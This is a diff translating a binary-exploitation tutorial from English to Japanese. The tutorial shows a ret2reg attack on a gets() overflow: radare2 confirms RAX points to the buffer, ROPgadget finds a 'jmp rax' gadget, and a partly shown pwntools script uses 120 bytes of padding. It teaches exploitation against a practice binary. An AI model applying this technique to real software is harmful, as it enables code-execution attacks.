@@ -2,7 +2,7 @@
 
 ## Source
 
-Any function that returns a pointer to the string once it acts on it is a prime target. There are many that do this, including stuff like `gets()`, `strcpy()` and `fgets()`. We''l keep it simple and use `gets()` as an example.
+処理した後に文字列へのポインタを返す関数は、格好の標的です。`gets()`、`strcpy()`、`fgets()` など、そのような関数は数多くあります。ここでは単純にするために、`gets()` を例として使います。
 
 ```c
 #include <stdio.h>
@@ -20,7 +20,7 @@ int main() {
 
 ## Analysis
 
-First, let's make sure that some register _does_ point to the buffer:
+まず、あるレジスタが本当にバッファを指していることを確認しましょう。
 
 ```text
 $ r2 -d -A vuln
@@ -41,7 +41,7 @@ $ r2 -d -A vuln
 └           0x0040113d      c3             ret
 ```
 
-Now we'll set a breakpoint on the `ret` in `vuln()`, continue and enter text`.`
+次に、`vuln()` の `ret` にブレークポイントを設定し、実行を続けてテキストを入力します。
 
 ```text
 [0x7f8ac76fa090]> db 0x0040113d
@@ -50,7 +50,7 @@ hello
 hit breakpoint at: 40113d
 ```
 
-We've hit the breakpoint, let's check if RAX points to our register. We'll assume RAX first because that's the traditional register to use for the return value.
+ブレークポイントに到達しました。RAX が入力したバッファを指しているか確認しましょう。戻り値に使う伝統的なレジスタなので、まず RAX だと仮定します。
 
 ```text
 [0x0040113d]> dr rax
@@ -59,11 +59,11 @@ We've hit the breakpoint, let's check if RAX points to our register. We'll assum
 hello
 ```
 
-And indeed it does!
+確かに指しています。
 
 ## Exploitation
 
-We now just need a `jmp rax` gadget or equivalent. I'll use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) for this and look for either `jmp rax` or `call rax`:
+あとは `jmp rax` ガジェットか、それと同等のものがあればよいだけです。ここでは [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) を使い、`jmp rax` か `call rax` のどちらかを探します。
 
 ```text
 $ ROPgadget --binary vuln | grep -iE "(jmp|call) rax"
@@ -82,7 +82,7 @@ $ ROPgadget --binary vuln | grep -iE "(jmp|call) rax"
 0x000000000040100b : test rax, rax ; je 0x401017 ; call rax
 ```
 
-There's a `jmp rax` at `0x40109c`, so I'll use that. The padding up until RIP is `120`; I assume you can calculate this yourselves by now, so I won't bother showing it.
+`0x40109c` に `jmp rax` があるので、これを使います。RIP までのパディングは `120` です。ここまで来れば自分で計算できるはずなので、その手順は示しません。
 
 ```python
 from pwn import *
@@ -102,5 +102,4 @@ p.interactive()
 
 ![](../../../../.gitbook/assets/image%20%2846%29.png)
 
-Awesome!
-
+すばらしい。
